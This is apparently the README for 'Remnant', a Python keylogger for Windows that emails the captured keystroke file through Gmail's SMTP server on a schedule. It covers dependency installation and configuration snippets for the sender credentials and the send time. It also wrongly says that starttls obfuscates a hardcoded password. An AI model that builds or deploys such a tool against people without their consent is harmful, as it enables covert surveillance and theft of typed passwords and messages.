# Remnant
A keylogger written in Python with scheduled emailing functionality.

## Getting Started
There are several modules that you will need to make sure are installed before you can run Remnant keylogger.

* datetime
* email
* platform
* pyHook
* pythoncom
* pywin32
* smtplib
* threading

Most of these modules can be installed using pip. For example:

```
pip install smtplib
```

The email module can be obtained using easy_install.

```
easy_install email
```

If you are having trouble installing pyHook module download the wheel file for it [here](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pyhook) and run the following command.

```
pip install pyHook‑1.5.1‑cp35‑cp35m‑win_amd64.whl
```
This example is installing pyHook for 64bit Windows and Python 3.5.

## Setup

Set your sending email and the address to which you want the keylog file to be sent.

```
fromaddr = "YOUR SENDING EMAIL ADDRESS"
toaddr = "YOUR RECEIVING EMAIL ADDRESS"
```
Also update these parameters with your email access credentials. Here we are using Gmail's smtp server on port 587. The password is placed directly in 'server.login' rather than a variable as the preceding line 'server.starttls' helps obfuscate this.

```
server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
server.login(fromaddr, "SENDING EMAIL ACCOUNT PASSWORD")
```
Set the time you want the keylog.txt file to be sent to you here:

```
y=x.replace(day=x.day+offset, hour=16, minute=30, second=0, microsecond=0)
```


## Disclaimer
This code is distributed for educational and research purposes. Do not use without a person's consent.

## License
This project is licensed under the GNU GENERAL PUBLIC LICENSE - see the [LICENSE](LICENSE) file for details.
